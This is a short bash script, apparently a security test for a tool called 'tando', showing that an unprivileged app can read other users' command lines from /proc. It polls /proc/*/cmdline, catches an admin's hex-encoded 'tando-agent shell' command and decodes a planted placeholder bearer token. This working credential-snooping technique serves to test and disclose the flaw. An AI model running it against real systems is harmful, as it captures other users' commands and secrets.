#!/bin/bash
# sec3 S3: an app reads other users' command lines (/proc is not restricted): the admin's
# `tando ssh bravo -- <cmd>` is visible (hex in sudo's argv, plain in systemd-run's).
set -u; . "$(dirname "$0")/lib.sh"; : "${R:?}" "${HP:?}"
T=$(mktemp)
(XT=30 x 'end=$((SECONDS+15)); while ((SECONDS<end)); do cat /proc/[0-9]*/cmdline 2>/dev/null | tr "\0" " " | grep -ao "tando-agent shell [a-z0-9-]* [0-9a-f]*"; done | sort -u') > "$T" &
sleep 2; "$R" ssh bravo -- 'echo "Authorization: Bearer SSH-SECRET-456" > /dev/null' < /dev/null; wait
awk '{print $4}' "$T" | while read -r h; do echo "$h" | xxd -r -p; echo; done; rm -f "$T"
